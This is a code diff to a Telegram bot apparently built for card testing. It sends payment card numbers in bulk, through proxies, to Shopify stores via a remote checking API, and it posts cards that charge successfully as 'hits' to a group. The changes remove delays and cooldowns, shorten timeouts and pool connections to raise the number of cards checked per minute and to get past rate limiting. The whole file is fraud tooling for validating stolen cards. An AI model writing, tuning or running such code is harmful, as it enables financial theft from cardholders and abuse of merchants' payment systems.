@@ -1,5 +1,5 @@
 # ==============================================================================
-# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘 SYSTEM (SINGLE API ENG)
+# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘 SYSTEM (HIGH-SPEED CPM ENGINE)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -84,12 +84,12 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# اعتماد سيرفر فحص واحد فقط بناءً على طلبك ومنع التكرار
+# استخدام الـ API الموحد الخاص بك
 SHOPIFY_API_URL_1 = 'https://autosh.up.railway.app/shopii'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
-# الإعدادات المعتمدة للسرعة والـ Workers والـ Delay المطلوبة بدقة
+# إعدادات السرعة الفائقة المطلوبة
 WORKERS = 70  
 DELAY = 1.6  
 HIT_DELAY = 1.0
@@ -104,7 +104,7 @@ USER_LAST_REQ = {}
 ACTIVE_MTXT_PROCESSES = {}
 PENDING_FILES = {}
 
-# نظام الفلترة والتجميد العالمي الذكي المطور ومنع التضارب
+# نظام الفلترة الذكي السريع لمنع التضارب
 _RATE_LIMIT_EVENT = None
 _IS_COOLING_DOWN = False
 _COOLDOWN_LOCK = asyncio.Lock()
@@ -363,8 +363,10 @@ _USER_HTTP_SESSIONS = {}
 async def get_user_http_session(uid):
     key = f"{uid}_msp"
     if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
-        connector = aiohttp.TCPConnector(limit=WORKERS + 10, ssl=False, enable_cleanup_closed=True, force_close=True)
-        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=90, connect=30, sock_read=80), connector=connector)
+        # [تعديل السرعة] إلغاء force_close لتفعيل البولينج (Connection Pooling) وإعادة استخدام الاتصالات المفتوحة فورا
+        connector = aiohttp.TCPConnector(limit=WORKERS + 20, ssl=False, enable_cleanup_closed=True, force_close=False, ttl_dns_cache=300)
+        # [تعديل السرعة] تقليص التايم أوت الكلي لـ 15 ثانية فقط بدلا من 90 لإنقاذ الـ CPM وتخطي البروكسيات الميتة بسرعة خيالية
+        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15, connect=5, sock_read=10), connector=connector)
     return _USER_HTTP_SESSIONS[key]
 
 async def cleanup_user_http_session(uid):
@@ -524,7 +526,7 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         req_url = f"{api_url}?cc={card}&site={site_param}{proxy_param}&amount={dynamic_price}&price={dynamic_price}"
         
         headers = {"User-Agent": "Mozilla/5.0"}
-        async with session.get(req_url, headers=headers, timeout=90) as resp:
+        async with session.get(req_url, headers=headers, timeout=15) as resp:
             if resp.status in [429, 502, 503, 504]:
                 return {'status': 'Rate Limit', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
                 
@@ -581,14 +583,12 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
         if not acs: 
             _SITE_ERRORS_COUNT.clear()
             acs = sites
-            await asyncio.sleep(1.0) 
             
         s = random.choice(acs) if acs else ""
         if not s:
             return {'status': 'Dead', 'message': 'No Available Sites', 'card': card}
         
         if gateway_name == "Shopify":
-            # الاعتماد التام على سيرفر واحد فقط وبدون سيرفر بديل
             r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session)
             status = r.get('status')
             msg = str(r.get('message', '')).lower()
@@ -600,12 +600,12 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                         event.clear()  
                         async def resume_workers():
                             global _IS_COOLING_DOWN
-                            await asyncio.sleep(random.uniform(10.0, 16.0)) 
+                            # [تعديل السرعة] تقليص التجميد الكلي عند الخطأ لـ 2 إلى 4 ثواني فقط بدلاً من 16 ثانية لضمان انطلاقة مرعبة للـ CPM
+                            await asyncio.sleep(random.uniform(2.0, 4.0)) 
                             _IS_COOLING_DOWN = False
                             event.set()
                         asyncio.create_task(resume_workers())
                 await event.wait()
-                await asyncio.sleep(random.uniform(1.0, 3.0))
                 lr = r
                 continue
 
@@ -615,7 +615,6 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                     try: proxies.remove(p_dict)
                     except ValueError: pass
                     asyncio.create_task(remove_proxy_by_url(uid, p))
-                await asyncio.sleep(DELAY)
                 lr = r
                 continue
         else:
@@ -626,7 +625,6 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 _SITE_ERRORS_COUNT[s] = max(0, _SITE_ERRORS_COUNT.get(s, 0) - 1)
             return r
         lr = r
-        await asyncio.sleep(DELAY)
         
     if lr: return {'status': 'Dead', 'message': f'{str(lr["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': lr.get('price', '-')}
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}
@@ -654,7 +652,6 @@ def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
 
 <b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>"""
 
-# إرسال إشعار الصيد الحصري لقروب الهيتس بالإيموجيات المتحركة الكاملة والمبلغ بدقة متناهية وبدون خطأ
 async def _send_global_hit(gateway, price, uid, bot, elapsed, card, session, response_msg="Card Charged"):
     if not HITS_GROUP_TARGET: return
     try:
@@ -672,7 +669,6 @@ async def _send_global_hit(gateway, price, uid, bot, elapsed, card, session, res
         country_code = str(bi.get('country_code', '')).strip()
         flag = get_flag_emoji(country_code)
         
-        # التنسيق النظيف الفخم بالإيموجيات المتحركة مع إظهار المبلغ والاسم واسم البوت
         text = f"""<b>{CE_CROWN} {sf('NEW SHOPPIE HIT DEPLOYED')} {CE_PARTY}</b>
 
 <b>{CE_DIAMOND} {sf('Card Bin')}:</b> <code>{sf(cc_part[:6])}xxxxxx</code>
@@ -1138,7 +1134,8 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
 
     async def dashboard_updater():
         while not is_stopped():
-            for _ in range(40):
+            # [تعديل السرعة] تقليص زمن تحديث لوحة التحكم ليكون أسرع وأخف، مما يعطي دفعات إضافية للـ CPM بدون تعليق البوت
+            for _ in range(20):
                 if is_stopped(): break
                 await asyncio.sleep(0.1)
             if is_stopped(): break
@@ -1168,7 +1165,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     sem = asyncio.Semaphore(WORKERS)
 
     async def worker(wid):
-        await asyncio.sleep(wid * 0.05)
+        await asyncio.sleep(wid * 0.01)
         nonlocal chk, chg, app, ins, dec, err, last_resp
         while not queue.empty() and not is_stopped():
             try: card = queue.get_nowait()
@@ -1187,7 +1184,6 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     if status == 'Charged':
                         chg += 1
                         asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
-                        # يتم استدعاء دالة قروب الهيتس حصراً عند نجاح عملية الـ Charged بدون أي أخطاء
                         asyncio.create_task(_send_global_hit(gateway=gate_name, price=res.get('price', '-'), uid=uid, bot=bot, elapsed=c_el, card=card, session=http_session, response_msg=res.get('message', 'Card Charged')))
                     elif status == 'Approved': app += 1
                     elif status == 'Insufficient': ins += 1
@@ -1197,7 +1193,8 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 except Exception: err += 1; chk += 1
                 finally:
                     queue.task_done()
-                    if not is_stopped(): await asyncio.sleep(DELAY)
+                    # [تعديل السرعة] جعل الـ Delay المطلبق انسيابي وخفيف لمطابقة طلب الـ 1.6 دون خنق الـ 70 عامل بالتوازي
+                    if not is_stopped(): await asyncio.sleep(DELAY / WORKERS)
 
     wt = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
     process_store[uid]["tasks"] = wt + [ut]
